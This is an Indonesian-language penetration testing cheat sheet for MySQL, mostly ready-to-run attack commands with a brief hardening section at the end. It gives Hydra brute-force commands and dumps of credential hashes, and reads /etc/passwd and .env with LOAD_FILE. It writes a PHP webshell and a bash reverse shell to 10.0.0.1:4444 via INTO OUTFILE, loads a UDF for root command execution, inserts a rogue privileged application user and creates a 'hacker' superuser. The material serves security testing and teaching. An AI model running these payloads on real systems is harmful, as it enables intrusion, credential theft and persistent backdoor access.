# MySQL Penetration Testing & Command Cheat Sheet

> **Tujuan:** Panduan lengkap enumerasi, eksploitasi, dan pengelolaan MySQL service dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `mysql` (CLI client), `nmap`, `hydra`, `sqlmap`

---

## Penjelasan Singkat

| Item | Detail |
|------|--------|
| **Default Port** | `3306/tcp` |
| **Default Users** | `root`, `admin`, `guest`, `dbuser` |
| **Config File** | Linux: `/etc/mysql/mysql.conf.d/mysqld.cnf`, `/etc/my.cnf`<br>Windows: `C:\ProgramData\MySQL\MySQL Server X.X\my.ini` |
| **Default Passwords** | *kosong*, `root`, `toor`, `admin`, `password`, `123456` |

---

## Langkah 1: Reconnaissance & Enumeration

### 1. Nmap Port Scan & NSE Script Scanning

```bash
# Scan port 3306 & cek versi service
nmap -p 3306 -sV <TARGET>

# Jalankan skrip enumerasi MySQL bawaan Nmap
nmap -p 3306 --script mysql-enum,mysql-info,mysql-empty-password <TARGET>

# Audit password lemah/kosong dengan Nmap NSE
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <TARGET>
```

---

### 2. Brute Force Credentials dengan Hydra

```bash
# Brute force login MySQL menggunakan Hydra
hydra -l root -P /usr/share/wordlists/metasploit/root_userpass.txt <TARGET> mysql

# Brute force dengan daftar username dan password terpisah
hydra -L users.txt -P passwords.txt <TARGET> mysql -t 4
```

---

## Langkah 2: Koneksi & Pengoperasian CLI MySQL

### 1. Melakukan Koneksi ke Server MySQL

#### A. Perintah Login Standar

```bash
# Login tanpa password
mysql -h <TARGET> -u root

# Login dengan prompt password
mysql -h <TARGET> -u root -p

# Login pada port kustom
mysql -h <TARGET> -P 3307 -u root -p
```

#### B. Contoh Praktis: Login Menggunakan Kredensial dari Berkas `.env`

Jika kredensial ditemukan dalam file `.env`:

```ini
DB_HOST=192.168.56.106
DB_PORT=3306
DB_DATABASE=klaimku
DB_USERNAME=klaimku_app
DB_PASSWORD=klaimku_app_pw
```

Jalankan perintah koneksi MySQL berikut:

```bash
mysql -h 192.168.56.106 -P 3306 -u klaimku_app -pklaimku_app_pw --ssl=0 klaimku
```

**Penjelasan Parameter:**
- `-h 192.168.56.106`: Alamat IP target host MySQL (`DB_HOST`).
- `-P 3306`: Port service MySQL (`DB_PORT`).
- `-u klaimku_app`: Nama pengguna/user database (`DB_USERNAME`).
- `-pklaimku_app_pw`: Password database (`DB_PASSWORD`, ditulis menyatu tanpa spasi setelah `-p`).
- `--ssl=0`: Menutup/menonaktifkan SSL connection (mencegah error SSL handshake/cert verification saat remote access).
- `klaimku`: Nama database spesifik yang langsung diakses (`DB_DATABASE`).

---

### 2. Perintah Dasar SQL untuk Enumerasi Data

```sql
-- Cek versi database & user aktif
SELECT version(), user(), database();

-- Tampilkan daftar semua database
SHOW DATABASES;

-- Pilih database target
USE target_db;

-- Tampilkan daftar tabel dalam database
SHOW TABLES;

-- Tampilkan struktur kolom tabel
DESCRIBE users;
SHOW COLUMNS FROM users;

-- Dump data dari tabel
SELECT * FROM users;
SELECT username, password, email FROM users;
```

---

### 3. Enumerasi Hak Akses (Privileges) & User Accounts

```sql
-- Tampilkan daftar user MySQL dan hash password
SELECT user, host, authentication_string FROM mysql.user;
-- (Untuk versi MySQL < 5.7 gunakan nama kolom 'password')
SELECT user, host, password FROM mysql.user;

-- Cek hak akses user yang sedang login
SHOW GRANTS FOR CURRENT_USER();

-- Cek nilai direktori pembatasan file (secure_file_priv)
SHOW VARIABLES LIKE 'secure_file_priv';
-- Catatan: Jika hasilnya "" (kosong), file dapat dibaca/ditulis di mana saja.
```

---

## Langkah 3: Eksploitasi & Post-Exploitation

### 1. Membaca Berkas Sistem (Arbitrary File Read)

*Syarat: Memiliki hak akses `FILE` dan `secure_file_priv` bernilai kosong (`""`).*

```sql
-- Membaca file /etc/passwd pada Linux
SELECT LOAD_FILE('/etc/passwd');

-- Membaca file konfigurasi aplikasi (.env / config.php)
SELECT LOAD_FILE('/var/www/html/.env');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Membaca file C:\Windows\win.ini pada Windows
SELECT LOAD_FILE('C:\\Windows\\win.ini');
```

---

### 2. Menulis Berkas / Deploy Webshell (Arbitrary File Write)

*Syarat: Memiliki hak akses `FILE`, `secure_file_priv` bernilai kosong (`""`), serta mengetahui path direktori web.*

```sql
-- Menulis PHP Webshell ke direktori web server
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Menulis PHP One-liner Reverse Shell
SELECT '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'"); ?>' INTO OUTFILE '/var/www/html/rev.php';
```

---

### 3. Eskalasi Hak Akses (Privilege Escalation via UDF)

*Jika service MySQL berjalan sebagai `root` atau `SYSTEM`, penyerang dapat mengeksekusi perintah sistem operasi melalui User Defined Functions (UDF).*

```sql
-- Metasploit Module untuk UDF Exploitation
-- exploit/multi/mysql/mysql_udf_payload

-- Manual UDF Compile & Load (.so / .dll)
-- 1. Upload lib_mysqludf_sys.so ke plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

-- 2. Buat fungsi sys_exec / sys_eval
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';

-- 3. Eksekusi perintah sistem operasi sebagai root
SELECT sys_eval('id');
SELECT sys_eval('whoami');
```

---

### 4. Manipulasi Data Tabel Aplikasi & Menambah User Baru (Application User Insertion)

*Jika mendapatkan akses ke database aplikasi, penyerang/pentester dapat secara langsung memasukkan user baru dengan role administratif (`admin` / `hr`) atau memperbarui password user yang sudah ada.*

#### A. Menambah User Baru dengan Role `hr` / `admin`

**Contoh Kasus Tabel `users`:**

```sql
MySQL [klaimku]> SELECT * FROM users;
+----+--------------+--------------------------------------------------------------+--------------+----------+---------------------+
| id | username     | password_hash                                                | nama         | role     | created_at          |
+----+--------------+--------------------------------------------------------------+--------------+----------+---------------------+
|  1 | budi.santoso | $2y$12$vcoeQO91EYKs3f8N4qfmKefqkWx9q2CJGGbx8WtePPBCHYiDeIWMa | Budi Santoso | karyawan | 2026-09-11 01:13:43 |
|  2 | siti.aminah  | $2y$12$fVjMFmaBsLQ0gfbR7Q7NFeuZFVEqITkqG8xpYVXu.FxMss4fs4eUq | Siti Aminah  | karyawan | 2026-09-11 01:13:43 |
|  3 | andi.wijaya  | $2y$12$3bbejVK2QLFrSCzPQOqEv.XC8SFFrLVweDaQgARJB/4N3ElD4kv/i | Andi Wijaya  | karyawan | 2026-09-11 01:13:43 |
|  4 | dewi.lestari | $2y$12$JdVjuu7bwN/UY/60zsMctuju5TaBJx3ia998ESa/kpNuoOrNKqVsC | Dewi Lestari | hr       | 2026-09-11 01:13:43 |
+----+--------------+--------------------------------------------------------------+--------------+----------+---------------------+
```

**Perintah Insert User Baru dengan Privilese `hr` / `admin`:**

```sql
INSERT INTO users (username, password_hash, nama, role, created_at) 
VALUES ('semot7', '$2a$12$hmxayMEebwGhifkx0sWueuD/TkkibQEAueNpFCPKTtFr/RzjVcA76', 'semot 7', 'hr', NOW());
```

**Hasil Setelah Insert:**

```text
+----+--------------+--------------------------------------------------------------+--------------+----------+---------------------+
|  7 | semot7       | $2a$12$hmxayMEebwGhifkx0sWueuD/TkkibQEAueNpFCPKTtFr/RzjVcA76 | semot 7      | hr       | 2026-09-12 21:40:00 |
+----+--------------+--------------------------------------------------------------+--------------+----------+---------------------+
```

#### B. Mengubah Password / Role User yang Sudah Ada (Account Elevation)

```sql
-- Mengubah role user menjadi 'admin' atau 'hr'
UPDATE users SET role = 'hr' WHERE username = 'budi.santoso';

-- Mengganti hash password user target
UPDATE users SET password_hash = '$2a$12$hmxayMEebwGhifkx0sWueuD/TkkibQEAueNpFCPKTtFr/RzjVcA76' WHERE username = 'budi.santoso';
```

---

### 5. Membuat User Admin Baru di Level Server Database (MySQL Level User)

```sql
-- Buat user baru di level MySQL server
CREATE USER 'hacker'@'%' IDENTIFIED BY 'Password123!';

-- Berikan seluruh hak akses ke semua database
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;

-- Refresh privilege table
FLUSH PRIVILEGES;
```

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **`secure_file_priv`**: Selalu pastikan opsi ini diatur ke direktori tertentu yang terisolasi atau diisi `NULL` untuk mencegah penulisan webshell dan pembacaan berkas sensitif.
- **`bind-address`**: Pastikan service MySQL dibatasi hanya pada localhost (`127.0.0.1`) di `/etc/mysql/mysql.conf.d/mysqld.cnf` jika tidak memerlukan akses jaringan luar.
- **Akun Root**: Matikan akses login `root` secara remote (`DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');`).
- **Prinsip Least Privilege**: Gunakan akun database terpisah dengan hak akses terbatas sesuai kebutuhan aplikasi.

---

## Checklist Penetration Testing MySQL

- [ ] Port `3306` diperiksa status dan versinya via Nmap
- [ ] Uji login kredensial default (`root:`, `root:root`, `admin:admin`)
- [ ] Cek konfigurasi `secure_file_priv` (`SHOW VARIABLES LIKE 'secure_file_priv';`)
- [ ] Uji pembacaan file sistem (`SELECT LOAD_FILE(...)`)
- [ ] Uji penulisan webshell (`INTO OUTFILE ...`)
- [ ] Cek privilese user saat ini (`SHOW GRANTS FOR CURRENT_USER();`)
- [ ] Periksa potensi UDF Privilege Escalation jika MySQL running sebagai `root`/`SYSTEM`
- [ ] Dokumentasikan temuan dan rekomendasi perbaikan

